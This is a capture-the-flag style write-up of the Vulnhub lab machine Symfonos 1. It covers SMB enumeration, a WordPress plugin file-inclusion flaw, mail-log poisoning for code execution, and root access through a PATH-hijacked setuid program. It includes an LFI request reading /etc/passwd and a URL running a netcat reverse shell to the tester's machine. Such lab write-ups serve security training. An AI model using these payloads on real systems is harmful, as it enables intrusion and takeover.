---
title:     "Vulnhub - Symfonos 1"
tags: [wordpress,easy,log-poisoning,smb,path,lfi,setuid]
---

Today, We are going to pwn Symfonos 1 by Zayotic from Vulnhub

## Description:

```
Beginner real life based machine designed to teach a interesting way of obtaining a low priv shell. SHOULD work for both VMware and Virtualbox.

    Name: symfonos: 1
    Difficulty: Beginner
    Tested: VMware Workstation 15 Pro & VirtualBox 6.0
    DHCP Enabled

Note: You may need to update your host file for symfonos.local

```
Download Link : <https://www.vulnhub.com/entry/symfonos-1,322/>


Lets Begin with our Initial Scan

## Nmap Scan Results:
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:42:7C:AD (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m23s, deviation: 3h27m50s, median: 23s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2020-03-08T00:09:12-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-08T06:09:12
|_  start_date: N/A

```

## SMB:

I started with ``SMB`` we can use ``smbmap`` to see is there any files available.
>smbmap - SMB enumeration tool

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/1.png)
```
-H HOST
              IP of host
```

So ``helios`` and ``anonymous`` are there and also ``attention.txt`` file.

There is a tool called ``smbclient`` which helps to access to the server.

>smbclient - ftp-like client to access SMB/CIFS resources on servers

First I tried with ``helios`` I can't login without password, So next is ``anonymous`` which I get logged in without password.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/2.png)<br/>
Downloaded the ``attention.txt`` to my machine.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/3.png)<br/>
This file contains a warning to the users to not use these password.

I tired again ``smbclient`` with ``helios`` with these 3 passwords.

> smbclient //192.168.1.101/helios -U helios

> -U, --user=USERNAME                       Set the network username

I logged in with ``qwerty`` and found 2 files, Downloaded them to my machine.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/4.png)

``research.txt``

```
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
```
``todo.txt``

```
1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```
``todo.txt`` told us to work on ``/h3l105`` it may be a directory. So I checked it in the webpage.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/5.png)

So Its a ``Wordpress`` site. We can use ``wpscan`` to enumerate users and plugins.

Found 2 plugins, I searched for any exploits available for them.
>wpscan --url http://symfonos.local/h3l105/ --enumerate p

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/6.png)<br/>
Found this LFI 
> https://www.exploit-db.com/exploits/40290

> http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/7.png)

Now time to change LFI to RCE, we can do it by ``Log poisoning``so I tried to access ``/var/log/apache2/access.log`` but its not working.
We know port ``SMTP`` is open.

>The Simple Mail Transfer Protocol is a communication protocol for electronic mail transmission.

So the user might have a mail and I found [SMTP Log poisoning](https://liberty-shell.com/sec/2018/05/19/poisoning/)

Found users mail log ``/var/mail/helios``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/8.png)

By following the article, Payload is injected <br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/9.png)

Now we can get reverse shell
> http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc%20-e%20/bin/sh%20192.168.1.103%201234

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/10.png)

## Privilege Escalation:

Uploaded my Enumeration Script to the machine and found a ``SETUID`` file.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/11.png)

When I run the file it prints the header of the webpage, and I did ``strings`` found ``curl`` is working and its path is not fully defined.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/12.png)

So I checked where is ``curl`` and its is in ``/usr/bin/curl``.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/15.png)

So we can create a file to give us shell and placed it in ``/tmp`` and name it as ``curl`` and change the PATH to ``/tmp``.

This command will make the PATH to search in ``/tmp`` first
> export PATH=/tmp:$PATH

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/13.png)

Once I execute the ``statuscheck`` the ``curl`` checks in ``/tmp`` first and it will make use of our file and give us root.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos1/14.png)

Rooted!!